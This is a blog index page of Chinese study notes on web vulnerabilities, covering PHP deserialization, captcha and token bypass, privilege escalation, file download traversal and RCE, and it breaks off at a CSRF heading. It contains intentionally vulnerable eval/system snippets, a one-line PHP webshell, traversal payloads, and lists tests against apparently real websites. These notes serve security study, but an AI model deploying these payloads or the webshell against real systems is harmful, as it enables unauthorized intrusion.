<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.0.2"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-PHP反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2021-11-26T11:06:00.000Z" itemprop="datePublished">2021-11-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">PHP反序列化漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h4><p>概念：序列化就是将对象转换成字符串，反序列化相反，数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象<br>原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。<br>serialize()        //将一个对象转换成一个字符串–序列化<br>unserialize()   //将字符串还原成一个对象–反序列化</p>
<h4 id="有类与无类"><a href="#有类与无类" class="headerlink" title="有类与无类"></a>有类与无类</h4><h5 id="1、有类-class"><a href="#1、有类-class" class="headerlink" title="1、有类  class"></a>1、有类  class</h5><p>​     触发魔术方法<br>​    __construct()<br>​    __destruct()<br>​    __wakeup()<br>​    __toString()<br>​    ……</p>
<h5 id="2、无类-不具有魔术方法"><a href="#2、无类-不具有魔术方法" class="headerlink" title="2、无类  不具有魔术方法"></a>2、无类  不具有魔术方法</h5><?php
class user{
    public $name='yucedu';
    public $age=18;
}
$a = new user();
$b = serialize($a);
echo $b;

?>

<h4 id="序列化格式"><a href="#序列化格式" class="headerlink" title="序列化格式"></a>序列化格式</h4><p>O:4:”user”:2:{s:3:”age”;i:18;s:4:”name”;s:3:”yucedu”;}<br>O代表对象；4代表对象名长度；2代表2个成员变量；</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>1、真实应用   java环境<br>2、各种CTF比赛</p>
<h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><p>1、SQL注入<br>2、代码执行<br>3、目录遍历<br>4、……</p>
<p>触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法：<br>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a><br>__construct()//创建对象时触发<br>__destruct() //对象被销毁时触发<br>__call() //在对象上下文中调用不可访问的方法时触发<br>__callStatic() //在静态上下文中调用不可访问的方法时触发<br>__get() //用于从不可访问的属性读取数据<br>__set() //用于将数据写入不可访问的属性<br>__isset() //在不可访问的属性上调用 isset()或 empty()触发<br>__unset() //在不可访问的属性上使用 unset()时触发<br>__invoke() //当脚本尝试将对象调用为函数时触发</p>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p> PHP反序列化无类本地测试<br>PHP反序列化有类魔术方法本地测试<br> 网鼎杯-AreUSerialz-有类魔术方法触发<br>    =   赋值<br>    ==  判断是否相等<br>    ===  全等，类型和数值都要一样</p>
<?php
class FileHandler{
public $op=' 2';
public $filename="flag.php";//文件开头调用的是 flag.php
public $content="yucedu";
}
$flag = new FileHandler();
$flag1 = serialize($flag);
echo $flag1;
?>

<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.ctfhub.com/#/challenge">https://www.ctfhub.com/#/challenge</a>   ctf网鼎杯反序列化题目<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a>    PHP反序列化基本知识</p>
<p>测试代码：<br>&lt;?php<br>error_reporting(0);<br>include “flag.php”;<br>$KEY = “yucedu”;<br>$str = $<em>GET[‘str’];<br>if (unserialize($str) ===$KEY)<br>{<br> echo “$flag”;<br>}<br>show_source(__FILE_</em>);</p>
<p>class ABC{<br> public $test;<br> function __construct(){<br> $test =1;<br> echo ‘调用了构造函数</br>‘;<br> }<br> function __destruct(){<br> echo ‘调用了析构函数</br>‘;<br> }<br> function __wakeup(){<br> echo ‘调用了苏醒函数</br>‘;<br> }<br>}<br>echo ‘创建对象 a</br>‘;<br>$a = new ABC;<br>echo ‘序列化<br>‘;<br>$a_ser=serialize($a);<br>echo ‘反序列化</br>‘;<br>$a_unser = unserialize($a_ser);<br>echo ‘GoodBye’;<br>?&gt;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/11/26/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="ckwgaav540007govj71zj1wol" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-逻辑越权漏洞-验证码和token安全及找回机制" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/" class="article-date">
  <time datetime="2021-11-21T07:59:26.000Z" itemprop="datePublished">2021-11-21</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/">逻辑越权漏洞-验证码和token安全及找回机制</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h4><h5 id="利用形式"><a href="#利用形式" class="headerlink" title="利用形式"></a>利用形式</h5><p>1、爆破   字典暴力破解<br>2、识别<br>3、复用<br>4、回显<br>5、绕过</p>
<p>常见类型：图片，手机或邮箱，语音，操作等<br>危害：权限泄漏，短信轰炸，恶意注册，任意用户操作等</p>
<h5 id="验证码识别插件工具使用"><a href="#验证码识别插件工具使用" class="headerlink" title="验证码识别插件工具使用"></a>验证码识别插件工具使用</h5><p>Pkav_Http_Fuzz , captcha-killer、打码平台等</p>
<h4 id="token-安全"><a href="#token-安全" class="headerlink" title="token 安全"></a>token 安全</h4><p>验证中可存在绕过可继续后续测试<br>token 爆破，token客户端回显等</p>
<h5 id="利用形式-1"><a href="#利用形式-1" class="headerlink" title="利用形式"></a>利用形式</h5><p>1、爆破<br>2、本地回显</p>
<h4 id="找回重置机制"><a href="#找回重置机制" class="headerlink" title="找回重置机制"></a>找回重置机制</h4><p>客户端回显，Response 状态值，验证码爆破，找回流程绕过</p>
<p>客户端回显：通过抓包或者浏览器找得到验证码<br>Response状态值：修改状态值进行绕过客户端验证<br>验证码爆破：通过暴力破解<br>找回流程绕过：跳过安全验证得步骤</p>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p> 验证码识别插件及工具操作演示     <a target="_blank" rel="noopener" href="http://www.isaipu.net/manage/login">http://www.isaipu.net/manage/login</a><br> 验证码绕过本地演示-pikachu<br> Token回显绕过登录爆破演示-pikachu<br>手机邮箱验证码逻辑-客户端回显<br>找回密码验证码逻辑-爆破测试<br> 绑定手机验证码逻辑-状态值篡改-实例   福利期货APP演示  <a target="_blank" rel="noopener" href="https://my.pcauto.com.cn/">https://my.pcauto.com.cn/</a></p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="http://downcode.com/downcode/j_16621.shtml">http://downcode.com/downcode/j_16621.shtml</a>   PHP云人才系统3.2源码下载<br><a target="_blank" rel="noopener" href="http://www.pc6.com/az/621330.html">http://www.pc6.com/az/621330.html</a>  福利期货APP下载<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hy627/p/14230099.html">https://www.cnblogs.com/hy627/p/14230099.html</a>  重置密码之验证流程防绕过<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12gMVx4DK-ATTANBWpkmK0w">https://pan.baidu.com/s/12gMVx4DK-ATTANBWpkmK0w</a>  提取码:qx2c     Pkav_Http_Fuzz工具下载<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cwkiller/p/12659549.html">https://www.cnblogs.com/cwkiller/p/12659549.html</a>     使用burp插件captcha-killer识别图片验证码<br><a target="_blank" rel="noopener" href="https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2">https://github.com/c0ny1/captcha-killer/releases/tag/0.1.2</a>    captcha-killer插件下载<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yufusec/p/9179625.html">https://www.cnblogs.com/yufusec/p/9179625.html</a>    Burpsuite模块—-Intruder模块详解</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/11/21/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%92%8Ctoken%E5%AE%89%E5%85%A8%E5%8F%8A%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6/" data-id="ckwgaav61001agovjafo7czx4" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-逻辑越权漏洞—-各种越权和数据篡改" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/" class="article-date">
  <time datetime="2021-11-16T13:23:53.000Z" itemprop="datePublished">2021-11-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/">逻辑越权漏洞—-各种越权和数据篡改</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="逻辑越权漏洞"><a href="#逻辑越权漏洞" class="headerlink" title="逻辑越权漏洞"></a>逻辑越权漏洞</h3><h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>原理：通过更换的某个 ID 之类的身份标识，从而使 A 账号获取（修改、删除等）B 账号数据。<br>同级别用户的跨越到另一个用户的信息<br>用户A–用户B–用户C–用户D</p>
<h5 id="其他用户名得到的？"><a href="#其他用户名得到的？" class="headerlink" title="其他用户名得到的？"></a>其他用户名得到的？</h5><p>1、从网站评论留言获取<br>2、从账户注册手段获取</p>
<h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>原理：使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。<br>从低权限跨越到一个高权限，普通用户享受超级管理员的权限<br>普通用户–&gt;计划专员–&gt;超级查看员–&gt;超级管理员</p>
<p>垂直越权：添加用户或者其他高权限操作<br>前提条件：获取的有关高权限操作的数据包</p>
<h5 id="数据包如何获取："><a href="#数据包如何获取：" class="headerlink" title="数据包如何获取："></a>数据包如何获取：</h5><p>1、普通用户前端界面具有高权限操作的按钮，模拟抓取数据包<br>2、通过网站源码本地搭建去模拟抓取<br>3、盲猜</p>
<h4 id="登录应用功能点安全问题"><a href="#登录应用功能点安全问题" class="headerlink" title="登录应用功能点安全问题"></a>登录应用功能点安全问题</h4><h5 id="检测功能点，危害"><a href="#检测功能点，危害" class="headerlink" title="检测功能点，危害"></a>检测功能点，危害</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.登录点暴力破解</span><br><span class="line">2.HTTP&#x2F;HTTPS 传输--明文与密文传输</span><br><span class="line">3.Cookie脆弱点验证--Cookie的简单验证</span><br><span class="line">4.Session会话固定测试--Session会话未及时清空</span><br><span class="line">5.验证密文比对安全测试--泄露密码加密方式</span><br></pre></td></tr></table></figure>

<h5 id="数据篡改安全问题"><a href="#数据篡改安全问题" class="headerlink" title="数据篡改安全问题"></a>数据篡改安全问题</h5><p>原理，检测，危害，修复等<br>参考：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/67080.html">https://www.secpulse.com/archives/67080.html</a></p>
<h5 id="商品购买流程："><a href="#商品购买流程：" class="headerlink" title="商品购买流程："></a>商品购买流程：</h5><p>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付</p>
<h5 id="常见篡改参数："><a href="#常见篡改参数：" class="headerlink" title="常见篡改参数："></a>常见篡改参数：</h5><p>商品编号 ID，购买价格，购买数量，订单号，支付状态等</p>
<h5 id="修复防御方案"><a href="#修复防御方案" class="headerlink" title="修复防御方案"></a>修复防御方案</h5><p>1.前后端同时对用户输入信息进行校验，双重验证机制<br>2.调用功能前验证用户是否有权限调用相关功能<br>3.执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限<br>4.直接加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理<br>5.永远不要相信来自用户的输入，对于可控参数进行严格的检查与过滤</p>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>   Pikachu-本地水平垂直越权演示<br>   墨者靶场-身份认证失效漏洞实战<br>   HTTP/HTTPS 协议密文抓取<br>   Cookie 脆弱点验证修改测试<br>   niushop商场系统商品支付逻辑测试-数量,订单<br>   大米CMS建站系统商品支付逻辑测试-价格,商品</p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/eUM3SktudHdrUVh6eFloU0VERzB4Zz09bW96aGUmozhe</a>     身份认证失效漏洞实战<br><a target="_blank" rel="noopener" href="https://github.com/huyuanzhi2/password_brute_dictionary">https://github.com/huyuanzhi2/password_brute_dictionary</a>  爆破字典<br><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1wTcWym1gTZOdZsVtCTxNsw">https://pan.baidu.com/s/1wTcWym1gTZOdZsVtCTxNsw</a>  提取码：dana   CMS靶场</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/11/16/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E6%BC%8F%E6%B4%9E%E2%80%94-%E5%90%84%E7%A7%8D%E8%B6%8A%E6%9D%83%E5%92%8C%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9/" data-id="ckwgaav61001bgovj4448f9ig" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-文件操作之文件下载读取" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" class="article-date">
  <time datetime="2021-11-11T04:52:26.000Z" itemprop="datePublished">2021-11-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/">文件操作之文件下载读取</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="文件下载，读取"><a href="#文件下载，读取" class="headerlink" title="文件下载，读取"></a>文件下载，读取</h4><p>原理，检测，利用，修复等</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.文件被解析，则是文件包含漏洞</span><br><span class="line">2.显示源代码，则是文件读取漏洞</span><br><span class="line">3.提示文件下载，则是文件下载漏洞</span><br><span class="line">4.文件被删除，则是文件删除漏洞   服务器上的文件能够被删除</span><br></pre></td></tr></table></figure>



<h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>白盒测试：代码审计<br>黑盒测试：<br>1、漏扫工具<br>2、公开漏洞<br>3、手工看参数值及功能点(资源下载)</p>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>1、常见文件 - 后台首页日志等可见文件<br>2、敏感文件 - 配置文件(数据库，平台，脚本语言等)<br>        - 各种接口文件<br>       - 密钥信息等文件</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=ai.png</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/unsafedownload/download/ai.png">http://127.0.0.1/pikachu/vul/unsafedownload/download/ai.png</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../down_nba.php">http://127.0.0.1/pikachu/vul/unsafedownload/execdownload.php?filename=../down_nba.php</a></p>
<h5 id="如何去获取敏感文件"><a href="#如何去获取敏感文件" class="headerlink" title="如何去获取敏感文件"></a>如何去获取敏感文件</h5><p>1、通过扫描工具或者爬虫爬取     御剑、A7kbscan-WebPathBrute<br>2、通过读取其他文件的信息并分析其路径</p>
<h5 id="文件下载漏洞url特点"><a href="#文件下载漏洞url特点" class="headerlink" title="文件下载漏洞url特点"></a>文件下载漏洞url特点</h5><p>文件名、参数值、目录符号<br>read.xxx?filename=<br>down.xxx?filename=<br>readfile.xxx?file=<br>downfile.xxx?file=</p>
<p>&amp;readpath=、&amp;filepath=、&amp;path=、&amp;inputfile=、&amp;url=、&amp;data=、&amp;readfile=、&amp;menu=、META-INF= 、WEB-INF</p>
<p>../   ..\    .\    ./  等<br>%00  ?  %23  %20 等</p>
<h5 id="各种协议调用配合"><a href="#各种协议调用配合" class="headerlink" title="各种协议调用配合"></a>各种协议调用配合</h5><h5 id="Javaweb-文件下载代码"><a href="#Javaweb-文件下载代码" class="headerlink" title="Javaweb 文件下载代码"></a>Javaweb 文件下载代码</h5><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a></p>
<p>&lt;%@ page language=”java” import=”java.util.*” pageEncoding=”UTF-8”%&gt;<br>&lt;%<br>String path = request.getContextPath();<br>String basePath =<br>request.getScheme()+”://“+request.getServerName()+”:”+request.getServerPort()+path+”/“;<br>%&gt;</p>
<p><a href="/download/DownloadServlet?filename=1.jpg">文件下载</a><br>public void doGet(HttpServletRequest request, HttpServletResponse response)<br>throws ServletException, IOException {<br>response.setCharacterEncoding(“UTF-8”);<br>//设置 ContentType 字段值<br>response.setContentType(“text/html;charset=utf-8”);<br>//获取所要下载的文件名称<br>String filename = request.getParameter(“filename”);<br>//下载文件所在目录<br>String folder = “/filename/“;<br>//通知浏览器以下载的方式打开response.addHeader(“Content-type”, “appllication/octet-stream”);<br>response.addHeader(“Content-Disposition”, “attachment;filename=”+filename);<br>//通知文件流读取文件<br>InputStream in = getServletContext().getResourceAsStream(folder+filename);<br>//获取 response 对象的输出流<br>OutputStream out = response.getOutputStream();<br>byte[] buffer = new byte[1024];<br>int len;<br>//循环取出流中的数据<br>while((len = in.read(buffer)) != -1){<br>out.write(buffer,0,len);</p>
<p>}<br>}</p>
<h4 id="涉及案例"><a href="#涉及案例" class="headerlink" title="涉及案例"></a>涉及案例</h4><p> Pikachu文件下载漏洞原理演示<br> zdns真实网站文件下载测试-功能点   <a target="_blank" rel="noopener" href="https://www.znds.com/">https://www.znds.com/</a><br> RoarCTF2019-Easy Java-文件下载读取真题复现<br>    七日情侣真实网站渗透测试   <a target="_blank" rel="noopener" href="http://www.danhaoteng.com/">http://www.danhaoteng.com</a><br> 小米路由器-文件读取真实测试-漏洞</p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Cheng_May/article/details/78600833">https://blog.csdn.net/Cheng_May/article/details/78600833</a>  javaWeb文件下载代码<br><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java">https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java</a>  CTF考题<br><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a>   小米路由器远程任意文件读取漏洞</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/11/11/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E8%AF%BB%E5%8F%96/" data-id="ckwgaav5v0015govjdpcnapna" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-RCE代码命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2021-11-04T14:53:00.000Z" itemprop="datePublished">2021-11-04</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">RCE代码命令执行漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="RCE代码及命令执行漏洞"><a href="#RCE代码及命令执行漏洞" class="headerlink" title="RCE代码及命令执行漏洞"></a>RCE代码及命令执行漏洞</h4><p>RCE(remote code/command execute)  远程代码/命令执行漏洞</p>
<p>如何产生：在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p>
<h4 id="RCE漏洞危害"><a href="#RCE漏洞危害" class="headerlink" title="RCE漏洞危害"></a>RCE漏洞危害</h4><p>1、执行系统命令(Windows：DOS命令、linux)<br>2、执行脚本代码(php、java、python)</p>
<h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><h5 id="RCE-漏洞产生相关性函数"><a href="#RCE-漏洞产生相关性函数" class="headerlink" title="RCE 漏洞产生相关性函数"></a>RCE 漏洞产生相关性函数</h5><p>PHP eval()函数<br>作用：把字符串按照PHP代码来计算</p>
<?php
$code=$_GET['x'];
eval($code); 
?>

<p>PHP system()函数<br>作用：执行外部程序，并显示输出<br>外部程序：操作系统与环境<br>执行的代码以系统的命令为主</p>
<?php
$code=$_GET['x'];
echo system($code); 
?>

<p>?id=1</p>
<h5 id="漏洞形成条件：可控变量、漏洞函数"><a href="#漏洞形成条件：可控变量、漏洞函数" class="headerlink" title="漏洞形成条件：可控变量、漏洞函数"></a>漏洞形成条件：可控变量、漏洞函数</h5><p>可控变量：基本上是网址上的传参，就是传递参数值来达到改变变量值<br>漏洞函数：使用哪个函数对变量进行操作</p>
<h5 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>白盒测试：代码审计<br>黑盒测试：<br>1、漏洞工具–OpenVAS、Nessus等<br>2、公开漏洞–寻找类似目标网站的公开漏洞<br>3、手工看参数值及功能点–判定参数值的数据是否和代码相关</p>
<h5 id="相关防御"><a href="#相关防御" class="headerlink" title="相关防御"></a>相关防御</h5><p>1、变量过滤或固定<br>2、禁用敏感函数<br>3、WAF产品防护</p>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>​    1、墨者靶场黑盒测试功能点命令执行-命令注入执行分析<br>​    2、墨者靶场白盒代码及命令执行-PHP代码分析溯源-代码分析<br>​    echo <code>$_REQUEST[a]</code><br>​    反引号的作用就是将反引号内的Linux命令先执行,然后将执行结果赋予变量，linux特有<br>​    3、墨者靶场黑盒层 RCE 漏洞检测-公开漏洞<br>​    当前目录、根目录<br>​    4、一句话 Webshell 后门原理代码执行-拓展说明-中国菜刀、冰蝎、蚁剑<br>​                <?php @eval($_POST['xx']);?><br>​    @表示不回显错误结果</p>
<h4 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/10819069.html">https://www.cnblogs.com/-qing-/p/10819069.html</a>          RCE漏洞函数<br><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/RWpnQUllbmNaQUVndTFDWGxaL0JjUT09bW96aGUmozhe</a>    命令注入执行分析<br><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/T0YyUmZRa1paTkJNQ0JmVWt3Sm13dz09bW96aGUmozhe</a>    PHP代码分析溯源<br><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/d01lL2RSbGEwZUNTeThVZ0xDdXl0Zz09bW96aGUmozhe</a>     Webmin未经身份验证的远程代码执行</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/11/04/RCE%E4%BB%A3%E7%A0%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="ckwgaav520004govjc8fbgm4u" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-CSRF和SSRF漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2021-11-01T08:32:30.000Z" itemprop="datePublished">2021-11-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/11/01/CSRF%E5%92%8CSSRF%E6%BC%8F%E6%B4%9E/">CSRF</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
